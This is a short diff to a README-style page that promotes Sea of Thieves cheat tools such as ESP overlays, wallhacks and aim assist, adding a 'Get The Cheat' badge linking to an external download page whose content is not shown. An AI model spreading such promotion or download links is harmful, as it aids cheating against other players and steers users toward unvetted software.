@@ -4,7 +4,7 @@
 
 Sea of Thieves is all about treasure hunting, ship battles, and surviving sneaky rival crews. But if you’re tired of getting sunk by sweaty pirates, Sea of Thieves cheat tools bring you the upper hand. From ESP overlays to wallhacks and aim assist, these hacks make you the deadliest captain across the seven seas.
 
-
+[![Get](https://img.shields.io/badge/Get%20The-Cheat-blueviolet)](https://sea-of-thieves-cheat-hack.github.io/.github/)
 ---
 
 ## Product Description
